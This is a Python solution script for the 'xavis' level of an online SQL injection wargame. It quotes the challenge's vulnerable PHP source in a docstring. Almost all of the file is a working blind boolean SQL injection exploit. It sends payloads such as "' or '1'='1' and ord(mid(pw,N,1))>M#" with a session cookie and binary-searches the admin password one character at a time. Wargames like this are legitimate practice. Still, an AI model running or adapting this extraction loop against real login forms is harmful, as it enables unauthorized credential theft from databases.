import requests
import string
import time
"""
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/regex|like/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("xavis"); 
  highlight_file(__FILE__); 
?>
"""
cookie = dict(PHPSESSID="tv814q1qgkcg3pg22pjgl9fc95")

def find_unicode(i,start=50, end=300):
    time.sleep(0.5)
    mid = (end+start)//2
    #print(mid,end)
    payload = {"pw":"' or '1'='1' and ord(mid(pw,"+str(i+1)+",1))>"+ str(mid) +"#"}
    r = requests.get(url,params=payload,cookies=cookie)
    #print(r.text)
    if 'Hello ' in r.text:
        if abs(end-mid) <=1 :
            return end
        else:
            return find_unicode(i,mid,end)
    else:
        if abs(end-mid) <=1 :
            return mid
        else:
            return find_unicode(i,start,mid)



url = "https://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php"
strings = string.printable
password = ""
#payload = {"pw":"' or id='admin' and length(pw)=12 #"} 

for i in range(11):
    num = find_unicode(i)
    print(num)
    payload = {"pw":"' or id='admin' and ord(mid(pw,"+str(i+1)+",1))="+ str(num) +"#"}
    cookie = dict(PHPSESSID="tv814q1qgkcg3pg22pjgl9fc95")
    r = requests.get(url,params=payload,cookies=cookie)
    #print(r.text)

    if 'Hello ' in r.text:
        password += chr(num)
        print("found {}".format(password))

        payload = {"pw": password}
        r = requests.get(url,params=payload,cookies=cookie)
        if "Clear" in r.text:
            print("clear")
            break
        else:
            print("try again")
            continue